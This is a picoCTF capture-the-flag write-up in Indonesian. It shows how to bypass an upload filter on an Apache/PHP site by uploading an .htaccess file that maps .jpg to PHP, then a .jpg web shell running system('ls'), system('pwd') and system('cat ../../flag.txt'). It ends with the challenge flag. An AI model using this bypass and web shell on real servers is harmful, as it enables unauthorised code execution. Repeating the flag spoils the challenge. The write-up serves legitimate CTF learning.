<img width="942" height="599" alt="image" src="https://github.com/user-attachments/assets/7018ad1c-ec28-4236-a81a-e3f6f7ee34ff" />

Web ini memiliki kerentanan RCE atau Remote Code Execution. Memang terlihat seperti kita diminta upload file image. Tapi coba kita curl untuk melihat sebenarnya bahasa apa dan engine apa yang digunakan server web ini.

```
┌──(w4llnut_07㉿kali)-[~]
└─$ curl -v http://amiable-citadel.picoctf.net:50163/
* Host amiable-citadel.picoctf.net:50163 was resolved.
* IPv6: (none)
* IPv4: 3.23.68.152
*   Trying 3.23.68.152:50163...
* Connected to amiable-citadel.picoctf.net (3.23.68.152) port 50163
* using HTTP/1.x
> GET / HTTP/1.1
> Host: amiable-citadel.picoctf.net:50163
> User-Agent: curl/8.15.0
> Accept: */*
> 
* Request completely sent off
< HTTP/1.1 200 OK
< Date: Sun, 02 Nov 2025 02:55:07 GMT
< Server: Apache/2.4.62 (Debian)
< X-Powered-By: PHP/8.3.22
< Vary: Accept-Encoding
< Content-Length: 974
< Content-Type: text/html; charset=UTF-8
```

Disini terlihat web ini menggunakna Apache server dengan bahasa PHP. Artinya kita bisa coba upload file PHP ke upload file yang disediakan. Misal exploit.php dengan isi file

```
<?php system('ls'); ?>
```

Namun ketika kita up ini ke server ternyata tidak diperbolehkan. Hasilnya Not Allowed

<img width="691" height="200" alt="image" src="https://github.com/user-attachments/assets/0434b294-2c3a-41d2-be48-e86b7352ca77" />

Lalu bagaimana caranya? yakni dengan mengubah file php tadi dengan ekstensi image. misal exploit.jpg namun ternyata cara ini tetap gagal. Bukan 100% gagal, tapi kita perlu melakukan upload file .htaccess agar bisa mengeksekusi file .jpg ke php. Karena web ini memiliki kerentanan hanya memfilter file ekstensi php dan menerima ekstensi lainnya, misal .htaccess disini. Coba buat file .htaccess dengan isi

```
AddHandler application/x-httpd-php .jpg
```
Dalam konfigurasi itu, kita memberi tahu server Apache agar mengeksekusi file .jpg sebagai kode PHP. Coba upload file .htaccess lalu coba upload file exploit.jpg setelahnya.

<img width="755" height="188" alt="image" src="https://github.com/user-attachments/assets/20770f5a-4561-48e2-a7c4-58ecce2966f0" />

Kita berhasil lihat output dari kode php kita dengan eksekusi method system('ls') untuk cek isi direktori saat ini. Kita bisa ubah ls dengan pwd misal yang nanti akan menghasilkan direktori, path saat ini dan juga flag. misal

```
<?php system('ls ../../'); ?>
<?php system('pwd'); ?>
<?php system('cat ../../flag.txt'); ?>
```

<img width="717" height="135" alt="image" src="https://github.com/user-attachments/assets/897fea6a-5adf-4804-99a7-c1eedf09ba09" />

Terlihat flag ada di dua direktori atas saat ini (../../) yang bisa langsung terbaca flagnya

**Flag: picoCTF{s3rv3r_byp4ss_9b8609cc}**
